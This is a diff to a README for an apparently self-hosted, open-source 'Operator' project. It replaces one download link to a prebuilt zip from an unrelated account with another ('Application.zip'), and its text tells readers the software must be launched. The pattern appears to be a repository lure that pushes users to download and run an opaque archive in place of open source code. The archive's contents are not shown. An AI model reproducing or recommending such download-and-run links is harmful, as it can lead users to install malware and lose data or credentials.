@@ -16,7 +16,7 @@ This repository allows you to create your self-hosted, open-source Operator mode
 
 ## Software Download
 
-[![Download Software](https://img.shields.io/static/v1?label=Download&message=Software&color=blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Yah185/open-source-operator/releases/download/v1.0/Application.zip)](https://github.com/Yah185/open-source-operator/releases/download/v1.0/Application.zip)
 
 The software linked above needs to be launched to access its features.
 
